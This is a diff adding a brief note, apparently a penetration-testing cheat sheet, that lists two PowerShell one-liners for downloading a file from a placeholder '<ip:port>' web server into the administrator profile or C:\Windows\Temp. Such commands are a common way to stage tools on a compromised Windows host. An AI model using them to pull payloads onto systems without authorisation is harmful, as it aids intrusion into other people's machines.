@@ -1,0 +1,6 @@
+// A list of ways to download files from a webserver with powershell
+
+Invoke-WebRequest "http://<ip:port>file to get>" -OutFile "C:\Users\administrator\<what to save file as>"
+
+
+(New-Object System.Net.WebClient).DownloadFile("http://<ip:port>/<file to get>", "C:\Windows\Temp\<what to save file as>") 
